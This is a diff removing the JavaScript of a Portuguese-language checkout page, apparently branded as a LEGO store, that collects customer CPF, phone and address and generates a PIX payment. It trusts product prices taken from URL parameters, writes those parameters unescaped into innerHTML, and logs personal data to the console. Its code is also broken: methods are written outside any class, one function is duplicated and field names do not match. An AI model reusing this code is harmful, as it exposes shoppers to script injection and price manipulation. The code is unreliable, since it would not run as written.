-                    <label class="flex items-center justify-between p-3 border rounded-lg cursor-pointer hover:bg-gray-50 transition-colors">
-                        <div class="flex items-center gap-3">
-                            <input type="radio" name="shipping" value="${option.price}" class="w-4 h-4 text-blue-600" onchange="selectShipping('${option.name}', ${option.price})">
-                            <div>
-                                <div class="font-medium">${option.name}</div>
-                                <div class="text-sm text-gray-600">${option.days}</div>
-                            </div>
-                        </div>
-                        <div class="font-semibold">${option.price === 0 ? 'Grátis' : formatCurrency(option.price)}</div>
-                    </label>
-                `;
-            });
-            
-            shippingList.innerHTML = optionsHTML;
-            shippingOptions.classList.remove('hidden');
-            
-            // Animação de entrada
-            setTimeout(() => {
-                shippingOptions.classList.remove('opacity-0');
-                shippingOptions.classList.add('opacity-100');
-            }, 50);
-        }
-
-        selectShipping(shippingName, shippingPrice) {
-            formData.shippingName = shippingName;
-            formData.shippingPrice = shippingPrice;
-            
-            // Mostrar campos de endereço com animação apenas se não for retirada
-            if (shippingName !== 'Retirada') {
-                const addressDetails = document.getElementById('addressDetails');
-                addressDetails.classList.remove('hidden');
-                
-                setTimeout(() => {
-                    addressDetails.classList.remove('opacity-0');
-                    addressDetails.classList.add('opacity-100');
-                }, 50);
-            } else {
-                // Esconder campos de endereço se for retirada
-                const addressDetails = document.getElementById('addressDetails');
-                addressDetails.classList.add('hidden', 'opacity-0');
-                addressDetails.classList.remove('opacity-100');
-            }
-            
-            // Habilitar botão de continuar
-            document.getElementById('continueAddressBtn').disabled = false;
-        }
-
-        updatePersonalSummary() {
-            const personalSummary = document.getElementById('personal-summary');
-            const personalSummaryPayment = document.getElementById('personal-summary-payment');
-            
-            if (formData.firstName && formData.email && formData.cpf) {
-                const summaryText = `${formData.firstName} ${formData.lastName || ''} • ${formData.email} • ${formData.cpf}`;
-                if (personalSummary) personalSummary.textContent = summaryText;
-                if (personalSummaryPayment) personalSummaryPayment.textContent = summaryText;
-            }
-        }
-
-        // Função para mostrar step específico
-        showStep(stepName) {
-            // Esconder todos os steps
-            document.querySelectorAll('.step-content').forEach(step => {
-                step.classList.add('hidden');
-            });
-            
-            // Mostrar step atual
-            const targetStep = document.getElementById(`step-${stepName}`);
-            if (targetStep) {
-                targetStep.classList.remove('hidden');
-                currentStep = stepName;
-            }
-            
-            if (stepName === 'payment') {
-                updatePaymentSummary();
-            }
-        }
-
-        // Função para validar email
-        validateEmail(email) {
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return emailRegex.test(email);
-        }
-
-        // Função para continuar do step de email
-        continueFromEmail() {
-            const emailInput = document.getElementById('email-step');
-            const email = emailInput.value.trim();
-            
-            if (!email) {
-                showToast('Por favor, informe seu e-mail', 'error');
-                return;
-            }
-            
-            if (!validateEmail(email)) {
-                showToast('Por favor, informe um e-mail válido', 'error');
-                return;
-            }
-            
-            // Salvar email nos dados do formulário
-            formData.email = email;
-            
-            // Preencher email no step de dados pessoais
-            document.getElementById('email-display').value = email;
-            
-            // Ir para próximo step
-            showStep('personal');
-        }
-
-        continueFromPersonal() {
-            const firstName = document.getElementById('firstName').value.trim();
-            const lastName = document.getElementById('lastName').value.trim();
-            const cpf = document.getElementById('cpf').value.trim();
-            const phone = document.getElementById('phone').value.trim();
-            
-            // Validações básicas
-            if (!firstName) {
-                showToast('Por favor, informe seu primeiro nome', 'error');
-                return;
-            }
-            
-            if (!lastName) {
-                showToast('Por favor, informe seu último nome', 'error');
-                return;
-            }
-            
-            if (!cpf) {
-                showToast('Por favor, informe seu CPF', 'error');
-                return;
-            }
-            
-            if (!validateCPF(cpf)) {
-                showToast('Por favor, informe um CPF válido', 'error');
-                return;
-            }
-            
-            if (!phone) {
-                showToast('Por favor, informe seu telefone', 'error');
-                return;
-            }
-            
-            if (!validatePhone(phone)) {
-                showToast('Por favor, informe um telefone válido', 'error');
-                return;
-            }
-            
-            // Salvar dados pessoais
-            formData.firstName = firstName;
-            formData.lastName = lastName;
-            formData.cpf = cpf;
-            formData.phone = phone;
-            formData.fullName = `${firstName} ${lastName}`;
-            
-            // Atualizar resumo
-            updatePersonalSummary();
-            
-            // Ir para próximo step
-            showStep('address');
-        }
-
-        // Função para continuar do step de endereço
-        continueFromAddress() {
-            // Validar se tem frete selecionado
-            const selectedShipping = document.querySelector('input[name="shipping"]:checked');
-            if (!selectedShipping) {
-                showToast('Por favor, selecione uma forma de entrega', 'error');
-                return;
-            }
-            
-            // Validar número do endereço
-            const addressNumber = document.getElementById('addressNumber').value.trim();
-            if (!addressNumber) {
-                showToast('Por favor, informe o número do endereço', 'error');
-                return;
-            }
-            
-            // Salvar dados de entrega
-            formData.shippingMethod = selectedShipping.value;
-            formData.shippingPrice = selectedShipping.dataset.price;
-            formData.addressNumber = addressNumber;
-            formData.complement = document.getElementById('complement').value.trim();
-            
-            // Atualizar resumos
-            updatePaymentSummary();
-            
-            // Ir para próximo step
-            showStep('payment');
-        }
-
-        updatePaymentSummary() {
-            const summaryElement = document.getElementById('orderSummary');
-            if (summaryElement) {
-                const productData = getProductData();
-                const productPrice = Math.round(productData.price * 100); // Converter para centavos
-                const shippingPrice = parseInt(formData.shippingPrice || 0);
-                const total = productPrice + shippingPrice;
-                
-                let summaryHTML = '';
-                
-                // Mostrar preço original se houver desconto
-                if (productData.discount > 0 && productData.originalPrice) {
-                    const originalPrice = Math.round(productData.originalPrice * 100);
-                    summaryHTML += `
-                        <div class="flex justify-between items-center py-2">
-                            <div class="flex items-center gap-3">
-                                <img src="${productData.image}" alt="${productData.name}" class="w-12 h-12 rounded object-cover">
-                                <span>${productData.name}</span>
-                            </div>
-                            <div class="text-right">
-                                <span class="line-through text-gray-500 text-sm">${formatCurrency(originalPrice)}</span>
-                                <br>
-                                <span class="text-green-600 font-semibold">${formatCurrency(productPrice)} (-${productData.discount}%)</span>
-                            </div>
-                        </div>
-                    `;
-                } else {
-                    summaryHTML += `
-                        <div class="flex justify-between items-center py-2">
-                            <div class="flex items-center gap-3">
-                                <img src="${productData.image}" alt="${productData.name}" class="w-12 h-12 rounded object-cover">
-                                <span>${productData.name}</span>
-                            </div>
-                            <span>${formatCurrency(productPrice)}</span>
-                        </div>
-                    `;
-                }
-                
-                summaryHTML += `
-                    <div class="flex justify-between items-center py-2">
-                        <span>Frete</span>
-                        <span>${formatCurrency(shippingPrice)}</span>
-                    </div>
-                    <div class="flex justify-between items-center py-2 font-semibold border-t">
-                        <span>Total</span>
-                        <span>${formatCurrency(total)}</span>
-                    </div>
-                `;
-                
-                summaryElement.innerHTML = summaryHTML;
-            }
-        }
-
-        // Função para ir para um step específico (para botões de editar)
-        goToStep(stepName) {
-            showStep(stepName);
-        }
-
-        // Captura parâmetros UTM da URL
-        getUtmParams() {
-            const urlParams = new URLSearchParams(window.location.search);
-            return {
-                utm_source: urlParams.get('utm_source'),
-                utm_medium: urlParams.get('utm_medium'),
-                utm_campaign: urlParams.get('utm_campaign'),
-                utm_content: urlParams.get('utm_content'),
-                utm_term: urlParams.get('utm_term'),
-                xcod: urlParams.get('xcod'),
-                sck: urlParams.get('sck'),
-                utm_id: urlParams.get('utm_id')
-            };
-        }
-
-        // Formatação de valores
-        formatCurrency(value) {
-            return new Intl.NumberFormat('pt-BR', {
-                style: 'currency',
-                currency: 'BRL'
-            }).format(value / 100);
-        }
-
-        parseCurrency(value) {
-            return parseInt(value.replace(/[^\d]/g, '')) || 0;
-        }
-
-        // Sistema de notificações toast
-        showToast(message, type = 'success') {
-            const existingToast = document.querySelector('.toast');
-            if (existingToast) {
-                existingToast.remove();
-            }
-
-            const toast = document.createElement('div');
-            toast.className = `toast ${type}`;
-            toast.textContent = message;
-            
-            document.body.appendChild(toast);
-            
-            setTimeout(() => {
-                toast.classList.add('show');
-            }, 100);
-            
-            setTimeout(() => {
-                toast.classList.remove('show');
-                setTimeout(() => {
-                    if (toast.parentNode) {
-                        toast.parentNode.removeChild(toast);
-                    }
-                }, 300);
-            }, 4000);
-        }
-
-        async processCheckout() {
-            console.log('[v0] Iniciando processo de pagamento LEGO...');
-            
-            try {
-                // Capturar dados do formulário
-                const utmParams = getUtmParams();
-                const productData = getProductData();
-                const productPrice = Math.round(productData.price * 100); // Converter para centavos
-                const shippingPrice = parseInt(formData.shippingPrice || 0);
-                const totalAmount = productPrice + shippingPrice;
-                
-                const btn = document.getElementById('finalizeBtn');
-                const originalText = btn.textContent;
-                
-                // Loading state
-                btn.innerHTML = '<div class="loading-spinner mx-auto"></div>';
-                btn.disabled = true;
-
-                // Preparar dados para API PIX
-                const paymentData = {
-                    nome: formData.name,
-                    email: formData.email,
-                    cpf: formData.cpf?.replace(/\D/g, '') || '',
-                    telefone: formData.phone?.replace(/\D/g, '') || '',
-                    endereco: formData.address,
-                    numero: formData.number,
-                    complemento: formData.complement || '',
-                    bairro: formData.neighborhood,
-                    cidade: formData.city,
-                    estado: formData.state,
-                    cep: formData.cep,
-                    amount: totalAmount
-                };
-
-                console.log('📤 Enviando dados para API PIX:', {
-                    produto: productData.name,
-                    valor: totalAmount,
-                    dados: paymentData
-                });
-
-                const response = await fetch(`${API_BASE_URL}/pagamento.php`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(paymentData)
-                });
-
-                const data = await response.json();
-                console.log('📥 Resposta da API PIX:', data);
-
-                if (data.success) {
-                    const params = new URLSearchParams({
-                        token: data.token,
-                        qrcode: data.pixCopiaECola || data.pixCode,
-                        pixKey: 'lego@store.com.br',
-                        amount: (totalAmount / 100).toFixed(2), // Passando em reais
-                        name: formData.name,
-                        email: formData.email,
-                        productName: productData.name,
-                        productImage: productData.image,
-                        ...utmParams
-                    });
-                    
-                    console.log('🔄 Redirecionando para PIX com dados processados...');
-                    window.location.href = `pix.html?${params.toString()}`;
-                } else {
-                    throw new Error(data.message || 'Erro ao gerar PIX');
-                }
-
-            } catch (error) {
-                console.error('❌ Erro no checkout LEGO:', error);
-                
-                // Restaurar botão
-                const btn = document.getElementById('finalizeBtn');
-                btn.textContent = 'Finalizar Compra';
-                btn.disabled = false;
-                
-                alert('Erro ao processar pagamento: ' + error.message);
-            }
-        }
-
-        showStep(stepName) {
-            // Esconder todos os steps
-            document.querySelectorAll('.step-content').forEach(step => {
-                step.classList.add('hidden');
-            });
-            
-            // Mostrar step atual
-            const targetStep = document.getElementById(`step-${stepName}`);
-            if (targetStep) {
-                targetStep.classList.remove('hidden');
-                currentStep = stepName;
-            }
-            
-            if (stepName === 'payment') {
-                updatePaymentSummary();
-            }
-        }
-
-        getProductData() {
-            const urlParams = new URLSearchParams(window.location.search);
-            
-            // Tentar obter dados da URL primeiro
-            let productData = {
-                name: urlParams.get('productName'),
-                price: parseFloat(urlParams.get('price')),
-                image: urlParams.get('image'),
-                discount: parseFloat(urlParams.get('discount')) || 0
-            };
-            
-            // Se não conseguir da URL, tentar localStorage
-            if (!productData.name || !productData.price) {
-                const storedProduct = localStorage.getItem('selectedProduct');
-                if (storedProduct) {
-                    const parsed = JSON.parse(storedProduct);
-                    productData = {
-                        name: parsed.name || productData.name,
-                        price: parsed.price || productData.price,
-                        image: parsed.image || productData.image,
-                        discount: parsed.discount || productData.discount || 0
-                    };
-                }
-            }
-            
-            // Aplicar desconto se houver
-            if (productData.discount > 0) {
-                productData.originalPrice = productData.price;
-                productData.price = productData.price * (1 - productData.discount / 100);
-            }
-            
-            // Fallback para valores padrão apenas se realmente não conseguir obter dados
-            return {
-                name: productData.name || 'Produto LEGO',
-                price: productData.price || 0,
-                originalPrice: productData.originalPrice,
-                image: productData.image || '/placeholder.svg?height=100&width=100',
-                discount: productData.discount || 0
-            };
-        }
-
-        populateCart() {
-            const productData = getProductData();
-            const cartProductElement = document.getElementById('cartProduct');
-            const cartSubtotalElement = document.getElementById('cartSubtotal');
-            const cartTotalElement = document.getElementById('cartTotal');
-            
-            if (cartProductElement) {
-                let productHTML = `
-                    <div class="flex items-center gap-4">
-                        <img src="${productData.image}" alt="${productData.name}" class="w-16 h-16 rounded object-cover">
-                        <div class="flex-1">
-                            <h3 class="font-semibold text-gray-900">${productData.name}</h3>
-                            <p class="text-sm text-gray-600">Produto fornecido e entregue por legobrasil</p>
-                            <div class="flex items-center gap-3 mt-2">
-                                <button class="w-8 h-8 border border-gray-300 rounded flex items-center justify-center hover:bg-gray-50" onclick="updateQuantity(-1)">
-                                    <span class="text-lg">−</span>
-                                </button>
-                                <span id="productQuantity" class="font-medium">1</span>
-                                <button class="w-8 h-8 border border-gray-300 rounded flex items-center justify-center hover:bg-gray-50" onclick="updateQuantity(1)">
-                                    <span class="text-lg">+</span>
-                                </button>
-                            </div>
-                        </div>
-                        <div class="text-right">
-                `;
-                
-                if (productData.discount > 0 && productData.originalPrice) {
-                    productHTML += `
-                        <div class="text-sm text-gray-500 line-through">${formatCurrency(Math.round(productData.originalPrice * 100))}</div>
-                        <div class="text-lg font-bold text-green-600">${formatCurrency(Math.round(productData.price * 100))}</div>
-                        <div class="text-xs text-green-600">-${productData.discount}% OFF</div>
-                    `;
-                } else {
-                    productHTML += `<div class="text-lg font-bold">${formatCurrency(Math.round(productData.price * 100))}</div>`;
-                }
-                
-                productHTML += `
-                        </div>
-                        <button class="text-blue-600 hover:text-blue-800 ml-2" onclick="removeProduct()">
-                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
-                            </svg>
-                        </button>
-                    </div>
-                `;
-                
-                cartProductElement.innerHTML = productHTML;
-                
-                const price = Math.round(productData.price * 100);
-                cartSubtotalElement.textContent = formatCurrency(price);
-                cartTotalElement.textContent = formatCurrency(price);
-            }
-        }
-
-        updateQuantity(change) {
-            const quantityElement = document.getElementById('productQuantity');
-            let quantity = parseInt(quantityElement.textContent) + change;
-            if (quantity < 1) quantity = 1;
-            if (quantity > 10) quantity = 10;
-            
-            quantityElement.textContent = quantity;
-            updateCartTotals();
-        }
-
-        updateCartTotals() {
-            const productData = getProductData();
-            const quantity = parseInt(document.getElementById('productQuantity').textContent);
-            const price = Math.round(productData.price * 100) * quantity;
-            
-            document.getElementById('cartSubtotal').textContent = formatCurrency(price);
-            document.getElementById('cartTotal').textContent = formatCurrency(price);
-        }
-
-        removeProduct() {
-            if (confirm('Deseja remover este produto do carrinho?')) {
-                // Redirecionar para página inicial ou mostrar carrinho vazio
-                window.location.href = '/';
-            }
-        }
-
-        continueFromCart() {
-            showStep('email');
-        }
-
-        document.addEventListener('DOMContentLoaded', function() {
-            // Carregar dados do produto no carrinho
-            populateCart();
-            
-            // Event listeners para carrinho
-            const calculateDeliveryBtn = document.getElementById('calculateDeliveryBtn');
-            if (calculateDeliveryBtn) {
-                calculateDeliveryBtn.addEventListener('click', calculateDeliveryFromCart);
-            }
-            
-            const closeOrderBtn = document.getElementById('closeOrderBtn');
-            if (closeOrderBtn) {
-                closeOrderBtn.addEventListener('click', () => showStep('email'));
-            }
-            
-            // Event listeners para opções de entrega
-            const receberBtn = document.getElementById('receberBtn');
-            const retirarBtn = document.getElementById('retirarBtn');
-            
-            if (receberBtn) {
-                receberBtn.addEventListener('click', () => toggleDeliveryOption('receber'));
-            }
-            
-            if (retirarBtn) {
-                retirarBtn.addEventListener('click', () => toggleDeliveryOption('retirar'));
-            }
-
-            console.log('✅ Checkout LEGO carregado');
-            console.log('🌐 API Base URL:', API_BASE_URL);
-            
-            populateCart();
-            
-            showStep('cart');
-
-            // Event listeners
-            document.getElementById('continueEmailBtn')?.addEventListener('click', continueFromEmail);
-            document.getElementById('continuePersonalBtn')?.addEventListener('click', continueFromPersonal);
-            document.getElementById('continueAddressBtn')?.addEventListener('click', continueFromAddress);
-            document.getElementById('finalizeBtn')?.addEventListener('click', processCheckout);
-            document.getElementById('calculateBtn')?.addEventListener('click', calculateShipping);
-            
-            document.getElementById('closeOrderBtn')?.addEventListener('click', continueFromCart);
-            document.getElementById('calculateDeliveryBtn')?.addEventListener('click', () => {
-                showStep('email');
-            });
-        });
     </script>
 </body>
 </html>
